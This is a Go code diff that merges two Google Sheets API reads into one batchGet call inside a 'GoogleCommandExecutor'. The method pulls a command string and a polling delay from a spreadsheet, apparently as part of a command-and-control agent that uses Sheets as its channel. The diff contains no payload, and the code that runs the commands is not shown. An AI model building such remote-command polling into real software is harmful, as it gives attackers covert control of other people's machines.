@@ -43,6 +43,10 @@ type ValueRange struct {
 	Values [][]interface{} `json:"values"`
 }
 
+type ValueRanges struct {
+	ValueRanges []ValueRange `json:"valueRanges"`
+}
+
 var ErrorUnableToCreateGoogleSpreadsheet = fmt.Errorf("an error occurred while creating Google spreadsheet")
 var ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration = fmt.Errorf("an error occurred while creating default Google spreadsheet configuration")
 
@@ -134,71 +138,47 @@ func createGoogleWorksheet(commandExecutor *GoogleCommandExecutor) error {
 
 }
 
-// TODO: merge two requests
 func (g *GoogleCommandExecutor) pullCommandAndTicker(rowIndex int) (string, int, error) {
 	var commandResult string
 	var tickerDelayResult int
 
 	rangeId := strconv.Itoa(rowIndex)
-	// Example: Sheet1!A2
-	readRange := fmt.Sprintf("%s!%s%s", g.googleSheetName, sheetCommandCell, rangeId)
+
+	readRangeCommand := fmt.Sprintf("%s!%s%s", g.googleSheetName, sheetCommandCell, rangeId)
+	readRangeTicker := fmt.Sprintf("%s!%s", g.googleSheetName, sheetTickerCell)
 
 	url := fmt.Sprintf(
-		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s",
+		"https://sheets.googleapis.com/v4/spreadsheets/%s/values:batchGet?ranges=%s&ranges=%s",
 		g.googleSheetID,
-		readRange,
+		readRangeCommand,
+		readRangeTicker,
 	)
-
 	request, err := http.NewRequest("GET", url, nil)
-
 	if err != nil {
 		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
 	}
-
 	resp, err := g.client.Do(request)
 	if err != nil {
 		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
 	}
 
-	var valueRange ValueRange
-	err = json.NewDecoder(resp.Body).Decode(&valueRange)
+	var values ValueRanges
+	err = json.NewDecoder(resp.Body).Decode(&values)
 	if err != nil {
 		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
 	}
 
-	if valueRange.Values != nil {
-		commandResult = valueRange.Values[0][0].(string)
+	if len(values.ValueRanges) != 2 {
+		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
+	}
+
+	if values.ValueRanges[0].Values != nil {
+		commandResult = values.ValueRanges[0].Values[0][0].(string)
 	} else {
 		commandResult = ""
 	}
-
-	// Ticker download
-	readRange = fmt.Sprintf("%s!%s", g.googleSheetName, sheetTickerCell)
-	url = fmt.Sprintf(
-		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s",
-		g.googleSheetID,
-		readRange,
-	)
-
-	request, err = http.NewRequest("GET", url, nil)
-
-	if err != nil {
-		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
-	}
-
-	resp, err = g.client.Do(request)
-	if err != nil {
-		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
-	}
-
-	var item ValueRange
-	err = json.NewDecoder(resp.Body).Decode(&item)
-	if err != nil {
-		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
-	}
-
-	if valueRange.Values != nil {
-		tickerDelayResult, err = strconv.Atoi(item.Values[0][0].(string))
+	if values.ValueRanges[1].Values != nil {
+		tickerDelayResult, err = strconv.Atoi(values.ValueRanges[1].Values[0][0].(string))
 		if err != nil {
 			tickerDelayResult = 0
 			err = fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
